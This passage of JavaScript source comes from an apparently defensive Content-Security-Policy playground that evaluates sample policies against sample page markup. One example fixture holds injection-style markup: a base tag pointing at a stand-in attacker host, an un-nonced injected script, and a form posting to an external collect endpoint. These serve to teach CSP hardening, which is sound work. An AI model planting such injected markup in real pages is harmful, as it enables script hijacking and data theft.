    "https: http: 'unsafe-inline'; object-src 'none'; base-uri 'self'";

  var STRICT_MARKUP = [
    '<!doctype html>',
    '<html>',
    '<head>',
    '  <base href="https://attacker.example/">',
    '  <script nonce="Nc3n83cnSAd3wc3Sasd/aQ==" src="/js/app.js"></script>',
    '  <script src="https://cdn.example.net/lib.js"></script>',
    '  <script nonce="Nc3n83cnSAd3wc3Sasd/aQ==">boot();</script>',
    '  <script>injected();</script>',
    '</head>',
    '<body>',
    '  <img src="https://anything.example.net/pixel.gif" alt="">',
    '  <form action="https://anything.example.net/collect"></form>',
    '</body>',
    '</html>'
  ].join('\n');

  function loadExample(policy, markup, title, notes) {
    el('tool-in').value = policy;
    el('csp-html').value = markup;
    currentPresetTitle = title || null;
    currentPresetNotes = notes || null;
    currentPresetSource = policy;
    var sel = el('csp-preset');
    if (sel) sel.value = '';
    run();
  }

  /* ======================================================================
     Wiring
     ====================================================================== */

  function run() {
    setStatus('working…', 'is-busy');
    try {
      evaluate();
    } catch (err) {
      out.rule();
      out.err('That input broke the evaluator.');
      out.line('');
      out.dim('Nothing was uploaded and nothing else on the page is affected.');
      out.dim('Details: ' + ((err && err.message) || String(err)));
      setStatus('failed', 'is-err');
      return;
    }
    // evaluate() finishes asynchronously when there is markup to hash; that
    // path sets its own status. Only the no-markup path lands here first.
    var node = el('csp-status');
    if (node && node.textContent === 'working…') setStatus('policy read', 'is-ok');
  }

  LabTool.define({
    id: 'cspplayground',
    run: run,
    onReady: function () {
      var sel = el('csp-preset');
      SITE_POLICIES.forEach(function (p, i) {
        var opt = document.createElement('option');
        opt.value = String(i);
        opt.textContent = p.path + '  —  ' + p.title;
        sel.appendChild(opt);
      });
      sel.addEventListener('change', function () {
        if (sel.value === '') { currentPresetSource = null; return; }
        var p = SITE_POLICIES[Number(sel.value)];
        el('tool-in').value = p.csp;
        currentPresetTitle = p.path + '  (' + p.title + ')  ' + p.extra;
        currentPresetNotes = p.notes;
        currentPresetSource = p.csp;
        if (!trim(el('csp-html').value)) el('csp-html').value = ORDINARY_MARKUP;
        run();
      });

      el('csp-ex-ordinary').addEventListener('click', function () {
        el('csp-url').value = 'https://krunalkumar.dpdns.org/labs/csp-playground';
        loadExample(SITE_POLICIES[0].csp, ORDINARY_MARKUP,
          SITE_POLICIES[0].path + '  (' + SITE_POLICIES[0].title + ')  ' +
          SITE_POLICIES[0].extra, SITE_POLICIES[0].notes);
      });

      el('csp-ex-traps').addEventListener('click', function () {
        el('csp-url').value = 'https://shop.example.com/checkout';
        loadExample(TRAP_POLICY, TRAP_MARKUP,
          'A policy with the classic mistakes in it', [
            'Written to look thorough. Read the review below before the verdicts:',
            'a typo\'d directive name, \'unsafe-inline\' cancelled by a nonce nobody',
            'noticed, img-src *, a missing base-uri, and no form-action.',
            'Every one of those is something I have seen shipped.'
          ]);
      });

      el('csp-ex-strict').addEventListener('click', function () {
        el('csp-url').value = 'https://app.example.com/dashboard';
        loadExample(STRICT_POLICY, STRICT_MARKUP,
          "The nonce + 'strict-dynamic' shape", [
            'This is the policy shape Google\'s CSP evaluator recommends, and the',
            'one case where \'unsafe-inline\' next to a nonce is deliberate: modern',
            'browsers ignore it because of the nonce, and browsers too old to',
            'understand nonces fall back to it. Same for https: and http:, which',
            '\'strict-dynamic\' silences. Watch what happens to the CDN script.'
          ]);
      });

      out.dim('Paste a Content-Security-Policy header value in the upper box and a');
      out.dim('page\'s markup in the lower one, then press Evaluate. Or start from one');
      out.dim('of the three examples, or from one of this site\'s four real policies');
      out.dim('in the dropdown.');
      out.line('');
      out.dim('Nothing is fetched. The markup is parsed with DOMParser, whose document');
      out.dim('has no browsing context: scripts in it do not run and images in it are');
      out.dim('not requested. Pasting a hostile page here is safe.');
    }
  });
})();
